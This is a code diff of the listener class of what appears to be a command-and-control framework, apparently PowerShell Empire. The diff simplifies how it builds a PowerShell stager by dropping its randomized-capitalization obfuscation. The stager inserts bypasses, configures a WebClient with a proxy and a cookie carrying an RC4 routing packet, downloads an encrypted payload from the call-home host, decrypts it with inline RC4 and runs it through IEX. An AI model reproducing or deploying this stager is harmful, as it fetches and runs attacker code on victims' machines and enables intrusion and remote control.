@@ -173,26 +173,18 @@ class Listener(object):
 
                 stager = '$ErrorActionPreference = "SilentlyContinue";'
                 if safeChecks.lower() == "true":
-                    stager = helpers.randomize_capitalization(
-                        "If($PSVersionTable.PSVersion.Major -ge 3){"
-                    )
+                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
+
                     for bypass in bypasses:
                         stager += bypass
-                    stager += "};"
-                    stager += helpers.randomize_capitalization(
-                        "[System.Net.ServicePointManager]::Expect100Continue=0;"
-                    )
+                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
-                stager += helpers.randomize_capitalization(
-                    "$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + "=New-Object System.Net.WebClient;"
-                )
+                stager += "$wc=New-Object System.Net.WebClient;"
 
                 if userAgent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
                     userAgent = profile.split("|")[1]
-                stager += "$u='" + userAgent + "';"
+                stager += f"$u='{ userAgent }';"
 
                 if "https" in host:
                     # allow for self-signed certificates for https connections
@@ -201,59 +193,31 @@ class Listener(object):
                 if userAgent.lower() != "none" or proxy.lower() != "none":
 
                     if userAgent.lower() != "none":
-                        stager += helpers.randomize_capitalization(
-                            "$"
-                            + helpers.generate_random_script_var_name("wc")
-                            + ".Headers.Add("
-                        )
-                        stager += "'User-Agent',$u);"
+                        stager += "$wc.Headers.Add('User-Agent',$u);"
 
                     if proxy.lower() != "none":
                         if proxy.lower() == "default":
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
+                            stager += (
+                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                             )
+
                         else:
                             # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization(
-                                "$proxy=New-Object Net.WebProxy;"
-                            )
-                            stager += helpers.randomize_capitalization(
-                                "$proxy.Address = '" + proxy.lower() + "';"
-                            )
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy = $proxy;"
-                            )
+                            stager += "$proxy=New-Object Net.WebProxy;"
+                            stager += f"$proxy.Address = '{ proxy.lower() }';"
+                            stager += "$wc.Proxy = $proxy;"
+
                         if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
-                            )
+                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+
                         else:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(":")[0]
                             password = proxyCreds.split(":")[1]
                             domain = username.split("\\")[0]
                             usr = username.split("\\")[1]
-                            stager += (
-                                "$netcred = New-Object System.Net.NetworkCredential('"
-                                + usr
-                                + "','"
-                                + password
-                                + "','"
-                                + domain
-                                + "');"
-                            )
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy.Credentials = $netcred;"
-                            )
+                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                            stager += f"$wc.Proxy.Credentials = $netcred;"
 
                 # TODO: reimplement stager retries?
 
@@ -262,23 +226,15 @@ class Listener(object):
                     for header in customHeaders:
                         headerKey = header.split(":")[0]
                         headerValue = header.split(":")[1]
-                        stager += helpers.randomize_capitalization(
-                            "$"
-                            + helpers.generate_random_script_var_name("wc")
-                            + ".Headers.Add("
-                        )
-                        stager += '"%s","%s");' % (headerKey, headerValue)
+                        stager += f'$wc.Headers.Add("{ headerKey }","{ headerValue }");'
 
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization(
-                    "$K=[System.Text.Encoding]::ASCII.GetBytes("
+                stager += (
+                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
                 )
-                stager += "'%s');" % (stagingKey)
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization(
-                    "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
-                )
+                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -292,33 +248,14 @@ class Listener(object):
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 # add the RC4 packet to a cookie
-                stager += helpers.randomize_capitalization(
-                    "$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + ".Headers.Add("
-                )
-                stager += '"Cookie","session=%s");' % (b64RoutingPacket.decode("UTF-8"))
+                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket.decode("UTF-8") }");'
 
-                stager += (
-                    "$ser="
-                    + data_util.obfuscate_call_home_address(host)
-                    + ";$t='"
-                    + stage0
-                    + "';"
-                )
-                stager += helpers.randomize_capitalization(
-                    "$data=$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + ".DownloadData($ser+$t);"
-                )
-                stager += helpers.randomize_capitalization(
-                    "$iv=$data[0..3];$data=$data[4..$data.length];"
-                )
+                stager += f"$ser= { data_util.obfuscate_call_home_address(host) };$t='{ stage0 }';"
+                stager += "$data=$wc.DownloadData($ser+$t);"
+                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization(
-                    "-join[Char[]](& $R $data ($IV+$K))|IEX"
-                )
+                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
                     stager = data_util.obfuscate(
